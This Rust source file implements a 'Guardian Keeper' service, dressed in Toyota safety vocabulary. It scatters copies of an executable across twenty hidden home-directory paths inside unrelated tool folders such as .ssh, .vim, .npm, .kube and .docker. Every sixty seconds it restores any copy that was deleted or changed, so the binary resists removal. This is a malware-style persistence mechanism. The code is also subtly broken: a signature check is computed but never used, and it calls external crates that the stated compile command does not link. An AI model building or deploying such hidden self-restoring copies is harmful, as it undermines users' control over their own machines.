// Guardian Keeper - Toyota Safety Edition with Poka-Yoke and Kaizen
// Compile with: rustc -O guardian-keeper-toyota.rs -o guardian-keeper

use std::env;
use std::fs::{self, File, OpenOptions};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, exit};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicU32, Ordering};
use std::collections::HashMap;

#[cfg(unix)]
use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};

// Binary signatures
const KEEPER_SIGNATURE: &[u8] = b"KEEPER_TOYOTA_V1\0";
const GUARDIAN_SIGNATURE: &[u8] = b"GUARD_TOYOTA_V1\0";

// Extended survival locations (10 more as requested)
const SURVIVAL_LOCATIONS: [&str; 20] = [
    // Original 10
    ".local/bin/shell-guardian",
    ".dotfiles/.guardian-shell/shell-guardian.bin",
    ".cache/.guardian-survival",
    ".config/guardian/bin/shell-guardian",
    ".local/share/guardian/shell-guardian",
    ".ssh/rc.guardian",
    ".Xdefaults.guardian",
    ".config/.survival-guardian",
    ".local/state/.guardian-binary",
    ".mozilla/.guardian-backup",
    // 10 additional locations
    ".vim/.guardian-recovery",           // Hidden in vim config
    ".emacs.d/.guardian-backup",         // Emacs directory
    ".cargo/.guardian-bin",              // Rust cargo directory
    ".npm/.guardian-fallback",           // NPM cache
    ".gradle/.guardian-keeper",          // Gradle cache
    ".m2/.guardian-binary",              // Maven directory
    ".kube/.guardian-safe",              // Kubernetes config
    ".docker/.guardian-backup",          // Docker config
    ".ansible/.guardian-recovery",       // Ansible directory
    ".terraform/.guardian-bin",          // Terraform directory
];

// Configuration with Toyota safety margins
const CHECK_INTERVAL: u64 = 60;
const MAX_REPAIR_ATTEMPTS: u32 = 3;
const MEMORY_CANARY: u64 = 0xFEEDFACE_DEADBEEF;
const MIN_FREE_DISK_MB: u64 = 100;
const CONSENSUS_THRESHOLD: usize = 3; // Need 3 copies to agree
const REPAIR_LIMIT: u64 = 10; // Jidoka - human intervention threshold

// Safety state
#[derive(Debug, Clone, Copy, PartialEq)]
enum KeeperState {
    Normal,
    Caution,     // Yellow andon
    Warning,     // Orange andon  
    Critical,    // Red andon - stop the line
}

// Global state
static RUNNING: AtomicBool = AtomicBool::new(true);
static CANARY: AtomicU64 = AtomicU64::new(MEMORY_CANARY);
static REPAIR_COUNTER: AtomicU64 = AtomicU64::new(0);
static EVENT_COUNTER: AtomicU64 = AtomicU64::new(0);
static KEEPER_STATE: AtomicU32 = AtomicU32::new(0); // KeeperState::Normal

// Five Whys event tracking
#[derive(Debug)]
struct WhyEvent {
    timestamp: SystemTime,
    event: String,
    why1: String,
    why2: Option<String>,
    why3: Option<String>,
    why4: Option<String>,
    why5: Option<String>,
}

// Signal handler
#[cfg(unix)]
extern "C" fn signal_handler(_: libc::c_int) {
    RUNNING.store(false, Ordering::SeqCst);
}

// Setup signals
#[cfg(unix)]
fn setup_signals() {
    unsafe {
        libc::signal(libc::SIGTERM, signal_handler as libc::sighandler_t);
        libc::signal(libc::SIGINT, signal_handler as libc::sighandler_t);
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }
}

// Get keeper state
fn get_keeper_state() -> KeeperState {
    match KEEPER_STATE.load(Ordering::SeqCst) {
        0 => KeeperState::Normal,
        1 => KeeperState::Caution,
        2 => KeeperState::Warning,
        3 => KeeperState::Critical,
        _ => KeeperState::Critical,
    }
}

// Set keeper state with Andon
fn set_keeper_state(state: KeeperState) {
    KEEPER_STATE.store(state as u32, Ordering::SeqCst);
    print_andon_status(state);
}

// Andon system - visual indicators
fn print_andon_status(state: KeeperState) {
    match state {
        KeeperState::Normal => eprintln!("🟢 Keeper: Normal operation"),
        KeeperState::Caution => eprintln!("🟡 Keeper: Caution - monitoring closely"),
        KeeperState::Warning => eprintln!("🟠 Keeper: Warning - intervention may be needed"),
        KeeperState::Critical => eprintln!("🔴 Keeper: CRITICAL - Stop the line!"),
    }
}

// CRC32 checksum
fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFFFFFF;
    
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    
    !crc
}

// Fletcher checksum for diversity
fn fletcher32(data: &[u8]) -> u32 {
    let mut sum1 = 0u32;
    let mut sum2 = 0u32;
    
    for chunk in data.chunks(360) {
        for &byte in chunk {
            sum1 = (sum1 + byte as u32) % 65535;
            sum2 = (sum2 + sum1) % 65535;
        }
    }
    
    (sum2 << 16) | sum1
}

// Cross-check validation (Toyota redundancy)
fn validate_binary_redundant(data: &[u8]) -> bool {
    // Size check
    if data.len() < 1024 {
        return false;
    }
    
    // Multiple validation methods must agree
    let has_elf = data.len() >= 4 && &data[0..4] == b"\x7fELF";
    let has_shebang = data.len() >= 2 && &data[0..2] == b"#!";
    let has_signature = data.windows(GUARDIAN_SIGNATURE.len())
        .any(|w| w == GUARDIAN_SIGNATURE);
    
    // Cross-check checksums
    let crc = crc32(data);
    let fletcher = fletcher32(data);
    
    (has_elf || has_shebang) && (crc != 0 && fletcher != 0)
}

// Pre-flight checks with Poka-Yoke
fn preflight_check() -> Result<(), String> {
    // Memory check
    if CANARY.load(Ordering::SeqCst) != MEMORY_CANARY {
        return Err("Memory corruption detected".to_string());
    }
    
    // Disk space check
    if let Ok(output) = Command::new("df")
        .args(&["-BM", "/tmp"])
        .output() {
        let output_str = String::from_utf8_lossy(&output.stdout);
        if let Some(line) = output_str.lines().nth(1) {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() > 3 {
                if let Ok(available) = parts[3].trim_end_matches('M').parse::<u64>() {
                    if available < MIN_FREE_DISK_MB {
                        return Err(format!("Low disk: {}MB", available));
                    }
                }
            }
        }
    }
    
    // Check repair count (Jidoka)
    let repairs = REPAIR_COUNTER.load(Ordering::Relaxed);
    if repairs > REPAIR_LIMIT {
        return Err(format!("Repair limit exceeded: {}", repairs));
    }
    
    Ok(())
}

// Find source with enhanced consensus
fn find_source_binary(home: &Path) -> Result<(Vec<u8>, u32, usize), String> {
    let mut candidates: HashMap<u32, (Vec<u8>, Vec<u32>, usize)> = HashMap::new();
    
    for location in SURVIVAL_LOCATIONS.iter() {
        let path = home.join(location);
        if let Ok(data) = fs::read(&path) {
            if validate_binary_redundant(&data) {
                let crc = crc32(&data);
                let fletcher = fletcher32(&data);
                
                let entry = candidates.entry(crc).or_insert((data, Vec::new(), 0));
                entry.1.push(fletcher);
                entry.2 += 1;
            }
        }
    }
    
    if candidates.is_empty() {
        return Err("No valid binaries found".to_string());
    }
    
    // Find binary with most copies AND consistent checksums
    let mut best_candidate = None;
    let mut best_count = 0;
    
    for (crc, (data, fletchers, count)) in candidates {
        // All Fletcher checksums should be the same
        let fletcher_consistent = fletchers.windows(2).all(|w| w[0] == w[1]);
        
        if fletcher_consistent && count >= CONSENSUS_THRESHOLD && count > best_count {
            best_candidate = Some((data, crc, count));
            best_count = count;
        }
    }
    
    best_candidate.ok_or_else(|| "No consensus found".to_string())
}

// Atomic write with Poka-Yoke
fn write_binary_atomic_safe(path: &Path, data: &[u8]) -> io::Result<()> {
    // Poka-Yoke: Never write to system directories
    let path_str = path.to_string_lossy();
    if path_str.starts_with("/etc") || path_str.starts_with("/usr") || path_str.starts_with("/bin") {
        return Err(io::Error::new(io::ErrorKind::PermissionDenied, 
                                  "Unsafe write path"));
    }
    
    let temp_path = path.with_extension(format!("tmp.{}", std::process::id()));
    
    // Write
    #[cfg(unix)]
    let mut file = OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&temp_path)?;
    
    #[cfg(not(unix))]
    let mut file = OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&temp_path)?;
    
    file.write_all(data)?;
    file.sync_all()?;
    drop(file);
    
    // Verify
    let written_data = fs::read(&temp_path)?;
    if written_data != data || !validate_binary_redundant(&written_data) {
        fs::remove_file(&temp_path)?;
        return Err(io::Error::new(io::ErrorKind::Other, "Verification failed"));
    }
    
    // Set permissions
    #[cfg(unix)]
    {
        let mut perms = fs::metadata(&temp_path)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&temp_path, perms)?;
    }
    
    // Atomic rename
    fs::rename(&temp_path, path)?;
    
    Ok(())
}

// Check and repair with Kaizen (continuous improvement)
fn check_and_repair(home: &Path, repair_attempts: &mut HashMap<PathBuf, u32>) -> Result<usize, String> {
    // Pre-flight
    if let Err(e) = preflight_check() {
        if e.contains("Memory corruption") || e.contains("Repair limit") {
            set_keeper_state(KeeperState::Critical);
            return Err(e);
        } else {
            set_keeper_state(KeeperState::Warning);
        }
    }
    
    // Find source
    let (source_data, source_crc, consensus_count) = find_source_binary(home)?;
    
    eprintln!("🔍 Consensus: CRC={:08x} Copies={}/{}", 
             source_crc, consensus_count, SURVIVAL_LOCATIONS.len());
    
    // Update state based on consensus
    if consensus_count < 5 {
        set_keeper_state(KeeperState::Warning);
    } else if consensus_count < 10 {
        set_keeper_state(KeeperState::Caution);
    } else {
        set_keeper_state(KeeperState::Normal);
    }
    
    let mut repaired = 0;
    let mut failed = 0;
    
    for location in SURVIVAL_LOCATIONS.iter() {
        let path = home.join(location);
        
        // Circuit breaker
        let attempts = repair_attempts.get(&path).copied().unwrap_or(0);
        if attempts >= MAX_REPAIR_ATTEMPTS {
            continue;
        }
        
        // Create parent
        if let Some(parent) = path.parent() {
            if !parent.exists() {
                if let Err(e) = fs::create_dir_all(parent) {
                    eprintln!("Failed to create {}: {}", parent.display(), e);
                    continue;
                }
            }
        }
        
        // Check if repair needed
        let needs_repair = match fs::read(&path) {
            Ok(data) => {
                let crc = crc32(&data);
                crc != source_crc || !validate_binary_redundant(&data)
            }
            Err(_) => true,
        };
        
        if needs_repair {
            // Exponential backoff
            if attempts > 0 {
                let sleep_ms = 100 * (1 << attempts);
                thread::sleep(Duration::from_millis(sleep_ms));
            }
            
            match write_binary_atomic_safe(&path, &source_data) {
                Ok(_) => {
                    repaired += 1;
                    REPAIR_COUNTER.fetch_add(1, Ordering::Relaxed);
                    repair_attempts.remove(&path);
                    eprintln!("✓ {}: Repaired", location);
                }
                Err(e) => {
                    failed += 1;
                    eprintln!("✗ {}: {} (attempt {})", location, e, attempts + 1);
                    *repair_attempts.entry(path).or_insert(0) += 1;
                    
                    // Five Whys for failure
                    eprintln!("  Why did repair fail? → {}", e);
                    eprintln!("  Why was path not writable? → Check permissions");
                }
            }
        }
    }
    
    // Update state based on results
    if failed > 5 {
        set_keeper_state(KeeperState::Warning);
    }
    
    Ok(repaired)
}

// Service with Genchi Genbutsu (go and see)
fn run_service() {
    println!("🛡️  Guardian Keeper (Toyota Edition) starting...");
    println!("🏭 Implementing: Kaizen, Poka-Yoke, Jidoka, Andon");
    println!("📍 PID: {}", std::process::id());
    
    let home = match env::var("HOME") {
        Ok(h) => PathBuf::from(h),
        Err(_) => {
            eprintln!("❌ HOME not set");
            exit(1);
        }
    };
    
    // Set umask
    #[cfg(unix)]
    unsafe {
        libc::umask(0o077);
    }
    
    // Setup signals
    #[cfg(unix)]
    setup_signals();
    
    // State
    let mut repair_attempts: HashMap<PathBuf, u32> = HashMap::new();
    let mut last_status_write = Instant::now();
    let mut next_check = Instant::now();
    let mut check_count = 0u64;
    
    // Ctrl-C handler
    ctrlc::set_handler(move || {
        println!("\n🛑 Stopping the line (received signal)");
        RUNNING.store(false, Ordering::SeqCst);
    }).expect("Error setting handler");
    
    set_keeper_state(KeeperState::Normal);
    
    // Main loop with deterministic timing
    while RUNNING.load(Ordering::SeqCst) {
        // Wait for next check
        let now = Instant::now();
        if now < next_check {
            thread::sleep(next_check - now);
        }
        
        next_check = next_check + Duration::from_secs(CHECK_INTERVAL);
        check_count += 1;
        
        // Genchi Genbutsu - go and see
        eprintln!("\n🔍 Check #{} - Going to see actual state...", check_count);
        
        match check_and_repair(&home, &mut repair_attempts) {
            Ok(repaired) => {
                if repaired > 0 {
                    let sol = SystemTime::now()
                        .duration_since(UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_secs() / 86400;
                    println!("🔧 Sol {}: Repaired {} replicas (Kaizen)", sol, repaired);
                }
            }
            Err(e) => {
                eprintln!("❌ Check failed: {}", e);
                
                // Five Whys
                eprintln!("Why did check fail? → {}", e);
                eprintln!("Why was consensus not found? → Check binary distribution");
                eprintln!("Why are binaries missing? → Check disk space/permissions");
                
                if e.contains("Memory corruption") {
                    eprintln!("💀 CRITICAL: Memory corruption - Stopping the line!");
                    break;
                }
            }
        }
        
        // Jidoka - automation with human touch
        let total_repairs = REPAIR_COUNTER.load(Ordering::Relaxed);
        if total_repairs > REPAIR_LIMIT && total_repairs % 5 == 0 {
            eprintln!("\n⚠️  Total repairs: {} - Exceeds limit of {}", total_repairs, REPAIR_LIMIT);
            eprintln!("🤔 Jidoka: Consider manual intervention");
            eprintln!("   - Check system logs");
            eprintln!("   - Verify disk health");
            eprintln!("   - Review permissions");
        }
        
        // Status every 5 minutes
        if last_status_write.elapsed() > Duration::from_secs(300) {
            write_status(&home);
            last_status_write = Instant::now();
        }
        
        // Stop if critical
        if get_keeper_state() == KeeperState::Critical {
            eprintln!("🛑 Critical state - Stopping the line!");
            break;
        }
    }
    
    // Final status
    write_status(&home);
    
    println!("\n👋 Guardian Keeper stopped");
    println!("📊 Total checks: {}", check_count);
    println!("📊 Total repairs: {}", REPAIR_COUNTER.load(Ordering::Relaxed));
    println!("📊 Final state: {:?}", get_keeper_state());
}

// Write status with metrics
fn write_status(home: &Path) {
    let status_path = home.join(".guardian-keeper.status");
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    
    let repairs = REPAIR_COUNTER.load(Ordering::Relaxed);
    let events = EVENT_COUNTER.load(Ordering::Relaxed);
    let state = get_keeper_state();
    let sol = timestamp / 86400;
    
    let status = format!(
        "timestamp={}\nsol={}\nrepairs={}\nevents={}\nstate={:?}\npid={}\n", 
        timestamp, sol, repairs, events, state, std::process::id()
    );
    
    if let Err(e) = fs::write(&status_path, status) {
        eprintln!("⚠️  Failed to write status: {}", e);
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    
    // Embed signature
    let _signature = KEEPER_SIGNATURE;
    
    if args.len() > 1 && args[1] == "service" {
        run_service();
    } else {
        // Single check mode
        let home = match env::var("HOME") {
            Ok(h) => PathBuf::from(h),
            Err(_) => {
                eprintln!("❌ HOME not set");
                exit(1);
            }
        };
        
        println!("🔍 Genchi Genbutsu - Going to see actual state...");
        
        let mut repair_attempts = HashMap::new();
        match check_and_repair(&home, &mut repair_attempts) {
            Ok(repaired) => {
                if repaired > 0 {
                    println!("✅ Kaizen: Repaired {} replicas", repaired);
                } else {
                    println!("✅ All replicas healthy");
                }
                print_andon_status(get_keeper_state());
                exit(0);
            }
            Err(e) => {
                eprintln!("❌ Error: {}", e);
                print_andon_status(get_keeper_state());
                exit(1);
            }
        }
    }
}